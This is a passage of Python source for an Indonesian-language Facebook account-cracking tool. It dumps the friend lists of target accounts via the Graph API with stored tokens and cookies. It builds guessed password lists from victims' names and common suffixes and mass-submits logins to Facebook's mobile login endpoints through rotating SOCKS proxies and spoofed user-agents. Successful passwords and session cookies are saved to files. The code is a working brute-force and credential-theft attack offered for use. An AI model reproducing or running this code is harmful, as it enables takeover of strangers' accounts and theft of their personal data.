                    Panel(f"{H2}• {P2}%s. %s    ──>   %s Idz " % (cih, isi, len(hem)))
                )
        geeh = console.input(f" {H2}• {P2} Pilih : ")
        try:
            geh = lol[geeh]
        except KeyError:
            console.print(f" {H2}• {P2} Pilih Yang Bener Kontol ")
            time.sleep(3)
            exit()
        try:
            lin = open("/sdcard/RUDAL-DUMP/" + geh, "r").read().splitlines()
        except:
            console.print(f" {H2}• {P2} File Tidak Ditemukan, Coba Lagi Nanti ")
            time.sleep(2)
            exit()
        for xid in lin:
            id.append(xid)
        setting()


# -----------------[ HASIL-CRACK ]-----------------#
def result():
    Console().print(
        panel(
            f"[bold white][[bold cyan]01[/][bold white]][/] [bold white]Lihat Hasil OK[/]           [bold white][[bold cyan]02[/][bold white]][/] [bold white]Lihat Hasil CP[/]",
            subtitle="╭───",
            subtitle_align="left",
            width=60,
            title=f"[bold white][/][bold green]List Menu Cek[/][bold white][/]",
            style=f"bold cyan",
        )
    )
    kz = Console().input(f"[bold cyan]   ╰─> ")
    if kz in ["2", "02"]:
        try:
            vin = os.listdir("CP")
        except FileNotFoundError:
            Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
            time.sleep(3)
            exit()
        if len(vin) == 0:
            Console().print("[bold cyan]   ╰─>[bold red] Anda Tidak Memiliki Hasil CP ")
            time.sleep(4)
            exit()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:
                    hem = open("CP/" + isi, "r").readlines()
                except:
                    continue
                cih += 1
                if cih < 10:
                    nom = "0" + str(cih)
                    lol.update({str(cih): str(isi)})
                    lol.update({nom: str(isi)})
                    Console(width=80, style="bold cyan").print(
                        panel(
                            "[bold white]["
                            + nom
                            + "] "
                            + isi
                            + " [bold yellow] "
                            + str(len(hem))
                            + " Account "
                            + x
                        )
                    )
                else:
                    lol.update({str(cih): str(isi)})
                    Console(width=60, style="bold cyan").print(
                        panel(
                            "[bold white]["
                            + str(cih)
                            + "] "
                            + isi
                            + " [bold yellow] "
                            + str(len(hem))
                            + " Account "
                            + x
                        )
                    )
            geeh = Console(width=60, style="bold cyan").input(f"[bold cyan]   ╰─> ")
            try:
                geh = lol[geeh]
            except KeyError:
                Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh ")
                exit()
            try:
                lin = open("CP/" + geh, "r").read().splitlines()
            except:
                Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
                time.sleep(4)
                exit()
            nocp = 0
            for cpku in range(len(lin)):
                cpkuni = lin[nocp].split("|")
                Console(width=60, style="bold cyan").print(
                    panel(f"[bold yellow] ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}")
                )
                nocp += 1
            Console().input("[bold yellow][ Klik Enter For Exit ]")
            exit()
    elif kz in ["1", "01"]:
        try:
            vin = os.listdir("OK")
        except FileNotFoundError:
            Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
            time.sleep(4)
            exit()
        if len(vin) == 0:
            Console().print("[bold cyan]   ╰─>[bold red] Anda Tidak Mempunyai File OK ")
            time.sleep(4)
            exit()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:
                    hem = open("OK/" + isi, "r").readlines()
                except:
                    continue
                cih += 1
                if cih < 60:
                    nom = "0" + str(cih)
                    lol.update({str(cih): str(isi)})
                    lol.update({nom: str(isi)})
                    Console(width=80, style="bold cyan").print(
                        panel(
                            "[bold white]["
                            + nom
                            + "] "
                            + isi
                            + " [bold yellow] "
                            + str(len(hem))
                            + " Account "
                            + x
                        )
                    )
                else:
                    lol.update({str(cih): str(isi)})
                    Console(width=60, style="bold cyan").print(
                        panel(
                            "[bold white]["
                            + str(cih)
                            + "] "
                            + isi
                            + " [bold yellow] "
                            + str(len(hem))
                            + " Account "
                            + x
                        )
                    )
            geeh = Console().input("[bold cyan]   ╰─> ")
            try:
                geh = lol[geeh]
            except KeyError:
                Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh")
                exit()
            try:
                lin = open("OK/" + geh, "r").read().splitlines()
            except:
                Console().print("[bold cyan]   ╰─>[bold red] File Tidak Di Temukan ")
                time.sleep(4)
                exit()
            nocp = 0
            for cpku in range(len(lin)):
                cpkuni = lin[nocp].split("|")
                Console(width=60, style="bold cyan").print(
                    panel(f"[bold green] ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}")
                )
                nocp += 1
            Console().input("[bold yellow][ Klik Enter For Exit ]")
            exit()
    else:
        Console().print("[bold cyan]   ╰─>[bold red] Pilih Yang Bener Atuhh")
        exit()

# ------------------[ DUMP-ID ]-----------------#
def publikv2():
    with requests.Session() as ses:
        token = open(".vipertok.txt", "r").read()
        cok = open(".vipercok.txt", "r").read()
        a = console.input(f" {H2}• {P2}Masukan Id Target :{U2} ")
        filetex = console.input(f" {H2}• {P2}Nama File Dump  :{U2} ")
        rspd = ("/sdcard/RUDAL-DUMP/" + filetex + ".txt").replace(" ", "_")
        koli = open(rspd, "w")
        try:
            b = ses.get(
                f"https://graph.facebook.com/{a}?fields=friends&access_token={token}",
                cookies={"cookie": cok},
            ).json()
            for c in b["friends"]["data"]:
                id.append(c["id"] + "|" + c["name"])
                koli.write(c["id"] + "|" + c["name"] + "\n")
                console.print(
                    f"\r {H2}• {P2}Mengumpulkan {H2} %s {P2} Id" % (len(id)), end="\r"
                )
                time.sleep(0.0050)
            console.print(f" {H2}• {P2}Total Id Dump :{H2} %s {P2} " % (len(id)))
            console.print(f" {H2}• {P2}File Disimpan Di {H2}%s{P2}" % (rspd))
            time.sleep(3)
            console.print(f" {H2}• {P2}Thank Sudah Mengunakan Script Ini")
            exit()
        except Exception as e:
            print(e)


# -------------------[ CRACK-Masal ]----------------#
def massal():
    try:
        token = open(".vipertok.txt", "r").read()
        cok = open(".vipercok.txt", "r").read()
    except IOError:
        exit()
    try:
        Console().print(
            Panel(
                "[bold white] Mau Berapa Target Yang Mau Di Crack",
                width=60,
                style=f"{color_panel}",
                title="[bold green] Crack Masal [bold white]",
            )
        )
        jum = int(input(f" • Masukan : "))
    except ValueError:
        Console().print(f" {H2}• {P2} Wrong input ")
        exit()
    if jum < 1 or jum > 80:
        Console().print(f" {H2}• {P2} Pertemanan Tidak Publik  ")
        exit()
    ses = requests.Session()
    yz = 0
    for met in range(jum):
        yz += 1
        Console().print(
            panel(
                "[bold white] Masukkan Target ke " + str(yz) + "",
                width=60,
                style=f"{color_panel}",
            )
        )
        kl = Console().input(f" {H2}• {P2}Masukan : ")
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get(
                f"https://graph.facebook.com/{userr}?fields=friends&access_token={token}",
                cookies={"cookie": cok},
            ).json()
            for mi in col["friends"]["data"]:
                try:
                    iso = mi["id"] + "|" + mi["name"]
                    if iso in id:
                        pass
                    else:
                        id.append(iso)
                except:
                    continue
        except (KeyError, IOError):
            pass
        except requests.exceptions.ConnectionError:
            Console().print(f" {H2}• {P2}Unstable Signal ")
            exit()
    try:
        setting()
    except requests.exceptions.ConnectionError:
        print(f"")
        print(" [+] Unstable Signal ")
        exit()
    except (KeyError, IOError):
        print(f" [+] Pertemanan Tidak Public ")
        time.sleep(3)
        exit()


def convert(cookie):
    cok = "fr=%s;datr=%s;c_user=%s;xs=%s" % (
        cookie["fr"],
        cookie["datr"],
        cookie["c_user"],
        cookie["xs"],
    )
    return str(cok)


def tahun(fx):
    if len(fx) == 15:
        if fx[:10] in ["1000000000"]:
            tahunz = "2009"
        elif fx[:9] in ["100000000"]:
            tahunz = "2009"
        elif fx[:8] in ["10000000"]:
            tahunz = "2009" 
        elif fx[:7] in [
            "1000000",
            "1000001",
            "1000002",
            "1000003",
            "1000004",
            "1000005",
        ]:
            tahunz = "2009"
        elif fx[:7] in ["1000006", "1000007", "1000008", "1000009"]:
            tahunz = "2010"
        elif fx[:6] in ["100001"]:
            tahunz = "2010"
        elif fx[:6] in ["100002", "100003"]:
            tahunz = "2011"
        elif fx[:6] in ["100004"]:
            tahunz = "2012"
        elif fx[:6] in ["100005", "100006"]:
            tahunz = "2013"
        elif fx[:6] in ["100007", "100008"]:
            tahunz = "2014"
        elif fx[:6] in ["100009"]:
            tahunz = "2015"
        elif fx[:5] in ["10001"]:
            tahunz = "2016"
        elif fx[:5] in ["10002"]:
            tahunz = "2017"
        elif fx[:5] in ["10003"]:
            tahunz = "2018"
        elif fx[:5] in ["10004"]:
            tahunz = "2019"
        elif fx[:5] in ["10005"]:
            tahunz = "2020"
        elif fx[:5] in ["10006"]:
            tahunz = "2021"
        elif fx[:5] in ["10009"]:
            tahunz = "2023"
        elif fx[:5] in ["10007", "10008"]:
            tahunz = "2022"
        else:
            tahunz = ""
    elif len(fx) in [9, 10]:
        tahunz = "2008"
    elif len(fx) == 8:
        tahunz = "2007"
    elif len(fx) == 7:
        tahunz = "2006"
    else:
        tahunz = ""
    return tahunz


# -------------[ PENGATURAN-IDZ ]---------------#
def setting():
    Console().print(Panel(f"{P2}[{color_text}01{P2}] Crack akun Old [/]\n{P2}[{color_text}02{P2}] Crack Akun New [/]\n{P2}[{color_text}03{P2}] Crack Akun Random [[bold green]Recommended[bold white]][/]",title="[bold green] %s " % (len(id)),width=60,style=f"{color_panel}"))
    hu = console.input(f" {H2}• {P2}Masukan : ")
    if hu in ["1", "01"]:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ["2", "02"]:
        muda = []
        for bacot in sorted(id):
            muda.append(bacot)
        bcm = len(muda)
        bcmi = bcm - 1
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -= 1
    elif hu in ["3", "03"]:
        for bacot in id:
            xx = random.randint(0, len(id2))
            id2.insert(xx, bacot)
    else:
        print(" [+] Pilih Yang Bener Sayang ")
        return setting
    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]validate v1[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]validate V2[bold white]\n{P2}[{color_text}03{P2}] Login Site [bold green]Reguler[bold white]\n{P2}[{color_text}04{P2}] Login Site [bold green]mbasic[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
    hc = console.input(f" {H2}• {P2}Masukan : ")
    if hc in ["1", "01"]:
        method.append("validatev1")
    elif hc in ["2", "02"]:
        method.append("validatev2")
    elif hc in ["3", "03"]:
        method.append("reguler")
    elif hc in ["4", "04"]:
        method.append("mbasic")
    else:
        method.append("validatev1")
    Console().print(Panel(f"[bold white]Apakah Anda Ingin Mengunakan UA Manual ? Y/T",title=f"[bold green]Setting User-Agent",width=60,style=f"{color_panel}"))
    uatambah = console.input(f" {H2}• {P2}Masukan : ")
    if uatambah in ["y", "Ya", "ya", "Y"]:
        ualuh.append("ya")
        bzer = console.input(f" {H2}• {P2}Masukan UA : ")
        ualu.append(bzer)
    else:
        ualuh.append("tidak")
    Console().print(Panel(f"{P2}[{color_text}01{P2}] metode Slow {H2}[Recomended]{P2}\n{P2}[{color_text}02{P2}] method cepat{P2}",width=60,style=f"{color_panel}"))
    hc = console.input(f" {H2}• {P2}Masukan : ")
    if hc in ["1", "01"]:
        metslow()
    elif hc in ["2", "02"]:
        metcepat()
    else:
        metcepat()


# -------------------[ CRACK-SLOW ]------------#
def metslow():
    global prog, des
    bi = random.choice([u, k, kk, b, h, hh])
    print("")
    urut = []
    urut.append(
        panel(
            f"[bold green]%s [bold white]" % (okc),
            width=30,
            title=f"[bold green]OK SAVE",
            style=f"{color_panel}",
        )
    )
    urut.append(
        panel(
            f"[bold yellow]%s [bold white]" % (cpc),
            width=30,
            title=f"[bold yellow]CP SAVE",
            style=f"{color_panel}",
        )
    )
    wa.print(Columns(urut))
    awal = datetime.now()
    Console().print(
        Panel(
            f"[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ",
            title=f"[bold yellow]CRACK-SLOW",
            width=60,
            style=f"{color_panel}",
        )
    )
    prog = Progress(TextColumn("{task.description}"))
    des = prog.add_task("", total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf, nmf = yuzong.split("|")[0], yuzong.split("|")[1].lower()
                frs = nmf.split(" ")[0]
                pwv = [
                    "pantek123",
                    "indonesia123",
                    "kontol123",
                    "domino123",
                    "anjing123",
                    "sayangku",
                    "maling123",
                    "sayang123",
                    "malang123",
                    "bismillah123",
                ]
                if len(nmf) < 6:
                    if len(frs) < 3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + "321")
                        pwv.append(frs + "123")
                        pwv.append(frs + "1234")
                        pwv.append(frs + "12345")
                        pwv.append(frs + "123456")
                else:
                    if len(frs) < 3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs + "321")
                        pwv.append(frs + "2000")
                        pwv.append(frs + "2001")
                        pwv.append(frs + "2002")
                        pwv.append(frs + "2003")
                        pwv.append(frs + "2004")
                        pwv.append(frs + "2005")
                        pwv.append(frs + "2006")
                        pwv.append(frs + "2007")
                        pwv.append(frs + "2008")
                        pwv.append(frs + "2010")
                        pwv.append(frs + "2009")
                        pwv.append(frs + "123")
                        pwv.append(frs + "1234")
                        pwv.append(frs + "12345")
                        pwv.append(frs + "123456")
                        pwv.append(frs + "1234567")
                        pwv.append(frs + "01")
                        pwv.append(frs + "02")
                        pwv.append(frs + "03")
                        pwv.append(frs + "04")
                        pwv.append(frs + "05")
                        pwv.append(frs + "06")
                if "ya" in pwpluss:
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:
                    pass
                if "validatev1" in method:
                    pool.submit(vipernew, idf, pwv,'m.prod.facebook.com')
                elif "validatev2" in method:
                    pool.submit(ValidateV2, idf, pwv)
                elif "reguler" in method:
                    pool.submit(crackreguler, idf, pwv,'m.facebook.com')
                elif "mbasic" in method:
                    pool.submit(crackbasi, idf, pwv)
                else:
                    pool.submit(vipernew, idf, pwv,'m.prod.facebook.com')
    print("")
    Console().print(
        Panel(
            f"[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan",
            subtitle="╭───",
            subtitle_align="left",
            title=f"[bold green]Cek Opsi",
            width=60,
            style=f"{color_panel}",
        )
    )
    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
    print("")

#-------------------[ CRACK-CEPAT ]------------#
def metcepat():
    global prog,des
    bi = random.choice([u,k,kk,b,h,hh])
    print('')
    urut = []
    urut.append(panel(f'[bold green]%s [bold white]'%(okc),width=30,title=f"[bold green]OK SAVE",style=f"{color_panel}"))
    urut.append(panel(f'[bold yellow]%s [bold white]'%(cpc),width=30,title=f"[bold yellow]CP SAVE",style=f"{color_panel}"))
    wa.print(Columns(urut))
    awal = datetime.now()
    Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ',title=f"[bold yellow]CRACK-CEPAT",width=60,style=f"{color_panel}"))
    prog = Progress(TextColumn('{task.description}'))
    des = prog.add_task('',total=len(id2))
    with prog:
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                frs = nmf.split(" ")[0]
                pwv = ["rasis123","rasis1234","rasis12345","bismillah"]
                if len(nmf)<6:
                    if len(frs)<3:
                        pass
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'321')
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'321')
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        pwv.append(frs+'123456')
                if 'ya' in pwpluss: 
                    for xpwd in pwnya:
                        pwv.append(xpwd)
                else:pass
                if "validatev1" in method:
                    pool.submit(vipernew, idf, pwv,'m.prod.facebook.com')
                elif "validatev2" in method:
                    pool.submit(ValidateV2, idf, pwv)
                elif "reguler" in method:
                    pool.submit(crackreguler, idf, pwv,'m.facebook.com')
                elif "mbasic" in method:
                    pool.submit(crackbasi, idf, pwv)
                else:
                    pool.submit(vipernew, idf, pwv,'m.prod.facebook.com')
    print("")
    Console().print(
        Panel(
            f"[bold green]Crack Telah Selesai,Jangan lupa Sholat Kawan",
            subtitle="╭───",
            subtitle_align="left",
            title=f"[bold green]Cek Opsi",
            width=60,
            style=f"{color_panel}",
        )
    )
    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
    print("")




#----------[ METODE-REGULER ]----------#	
def crackreguler(idf,pwv,url):
	global loop,ok,cp
	ses = requests.Session()
	rr = random.randint
	rc = random.choice
	emot = rc(["😝","😜","🤪"])
	prog.update(des,description=f" {K2}•{H2} REGULER NYOBA ☕ {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
	prog.advance(des)
	for pw in pwv:
		try:
			proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt').text
			open('socks4.txt','w').write(proxs)
			nip = rc(proxs)
			proxs = {'http': 'socks5://'+nip}
			ua = opera()
			ua2 = random.choice(ugen2)
			ses.headers.update(
			{
			"Host":url,
			"upgrade-insecure-requests":"1",
			"user-agent":ua,
			"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
			"dnt":f"{str(rr(1,9))}",
			"x-requested-with":"mark.via.gp",
			"sec-fetch-site":"same-origin",
			"sec-fetch-mode":"cors",
			"sec-fetch-user":"empty",
			"sec-fetch-dest":"document",
			"referer":f"https://{url}/",
			"accept-encoding":"gzip, deflate br",
			"accept-language":"en-US;q=0.8,en;q=0.7"
			}
		)
			link = ses.get('https://m.facebook.com/login/?email='+idf).text
			date = ({'lsd':re.search('name="lsd" value="(.*?)"', str(link)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"', str(link)).group(1),'m_ts':re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
'li':re.search('name="li" value="(.*?)"', str(link)).group(1),'email':idf,'pass':pw})
			ses.headers.update(
			{
			'Host': url,
			'cache-control': 'max-age=0',
			'upgrade-insecure-requests': '1',
			'origin': 'https://'+url,
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'sec-fetch-site': 'same-origin',
			'sec-fetch-mode': 'cors',
			'sec-fetch-user': 'empty',
			'sec-fetch-dest': 'document',
			'referer': f'https://{url}/login/?email='+idf,
			'accept-encoding':'gzip, deflate br',
			'accept-language': 'en-US;q=0.8,en;q=0.7'
			}
		)
			po = ses.post(f"https://{url}/login/login/device-based/regular/login/?shbl=1&refsrc=deprecated", data=date,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki = ses.cookies.get_dict()
				kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
				print(f"\n⌲ User ID: {hijo}{idf}{puti}")
				print(f"⌲ Password: {hijo}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f"⌲ Cookie: {hijo}{kuki}{puti}")
				print(f'{hijo}{ua}')
				open('OK/' + okc, 'a').write(f"{idf}|{pw}|{kuki}|{ua}\n")
				break			
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f"\n⌲ User ID: {kun}{idf}{puti}")
				print(f"⌲ Password: {kun}{pw}{puti}")
				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
				print(f'{kun}{ua}')
				open('CP/' + cpc, 'a').write(f"{idf}|{pw}|{kuki}|{ua}\n")
				akune.append(idf+'|'+pw)
				ceker(idf,pw)
				cp+=1
				break	
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1



def reghehe(idf, pwv):
    global loop, ok, cp
    prog.update(
        des,
        description=f" {K2}•{H2} REGULER NYOBA ☕ {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]"
    )
    prog.advance(des)
    pro = random.choice(ugen)
    ses = requests.Session()

    for pwku in pwv:
        try:
            headers = {
                'authority': 'mbasic.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control': 'max-age=0',
                'dpr': '2.200000047683716',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"21121119SG"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"13.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro,
                'viewport-width': '980',
            }
            link = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8', headers=headers).text

            headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://mbasic.facebook.com',
                'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
                'sec-fetch-site': 'same-origin',
            })

            params = {
                'refsrc': 'deprecated',
                'lwv': '101',
                'ref': 'dbl',
            }

            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(link)).group(1),
                "try_number": re.search('name="try_number" value="(.*?)"', str(link)).group(1),
                "unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"', str(link)).group(1),
                "email": idf,
                "pass": pwku,
                "login": "Masuk",
                "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(link)).group(1),
            }

            po = ses.post(
                'https://mbasic.facebook.com/login/device-based/regular/login/',
                headers=headers, params=params, data=data
            )

            if "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                kuki = ";".join([f"{key}={value}" for key, value in ses.cookies.get_dict().items()])
                print(f"\r{H}[OK] {idf}|{pwku}|{kuki}")
                open('OK/' + okc, 'a').write(f"{idf}|{pwku}|{kuki}|{ua}\n")
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                cp += 1
                print(f"\r{M}[CP] {idf}|{pwku}{N}")
                open('CP/' + cpc, 'a').write(f"{idf}|{pwku}|{kuki}|{ua}\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            sleep(10)
    
    loop += 1



def rebsusgular(idf,pwv):
	global loop,ok,cp
	prog.update(des,description=f" {K2}•{H2} REGULER NYOBA ☕ {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
	prog.advance(des)
	pro = random.choice(ugen)
	ses = requests.Session()
	for pwku in pwv:
		try:
			headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '2.200000047683716',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"21121119SG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',
}
			link = ses.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',headers=headers).text
			headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'dbln=%7B%22100051715724900%22%3A%22ZciomVyp%22%2C%22100091847710393%22%3A%225sbab0VN%22%2C%2261555820308070%22%3A%22QsX6TjXO%22%2C%2261550060520876%22%3A%22RHmXZkji%22%2C%22100074047853047%22%3A%22RLsqqcNd%22%2C%22100052483280852%22%3A%22dLKB2q8l%22%2C%22100013928473639%22%3A%22pUWocsN4%22%7D; zsh=ASTFY_HA_ilaJ1aaaReI-R4IEEtF6dxomsGgJar0sg2kje5ubL3lCwjFmpGMTflPDAzpO_2Ad-o0TMTrVssUC6VN9lEYWmEzZEbfzD018TAsWZBT7OKODdYab1VTunPwsqTwpxDT5Dl0N-vXUDME5oOON_D7_1rOi4YkvVaEoEBAY_vJaTJjYlI6ARkQi-Hp0mqRjNZW9bj4tHkwnKwWL0jL46eStJE1HZyK9kyG0k4x10xY9QGeke3N4FklV_BmPDRnDB5ByOc-GMCqCuBNvYe12HTps0HLpywqjUvMa4Pd7_AGNl6cxVPjO9r6NCWtqafvQGdG3hOh; datr=7ne-Zt07cO5AU6EQEJVIThxN; oo=v1; sb=7ne-Zun-YtDHd533skCsDAFD',
    'dpr': '2.200000047683716',
    'origin': 'https://mbasic.facebook.com',
    'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"21121119SG"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro,
    'viewport-width': '980',
}
			params = {
    'refsrc': 'deprecated',
    'lwv': '101',
    'ref': 'dbl',
}
			data ={
	"lsd":re.search('name="lsd" value="(.*?)"', str(link)).group(1),
    "jazoest":re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
    "m_ts": re.search('name="m_ts" value="(.*?)"',str(link)).group(1),
    "li": re.search('name="li" value="(.*?)"',str(link)).group(1),
	"try_number": re.search('name="try_number" value="(.*?)"',str(link)).group(1),
	"unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"',str(link)).group(1),
	"email":idf,
	"pass":pwku,
	"login":"Masuk",
	"bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link)).group(1),
}
			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/',headers=headers,params=params,data=data)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{H}[OK] {idf}|{pwku}|{kuki}")
				open('OK/'+okc,'a').write(idf+'|'+pwku+'|'+kuki+'|'+ua+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				cp+=1
				print(f"\r{M}[CP] {idf}|{pwku}{N}")
				open('CP/'+cpc,'a').write(idf+'|'+pwku+'|'+kuki+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			sleep(10)
	loop+=1


#------------------[ METHOD-VALIDATE-2 ]-------------------#
def ValidateV2(idf,pwv):
	global loop,ok,cp
	rc = random.choice
	rr = random.randint
	bo = random.choice([m,b,k,h,u])
	prog.update(des,description=f" {K2}•{H2} VALIDATE V2 {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
	prog.advance(des)
	ua = random.choice(ugentotha)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
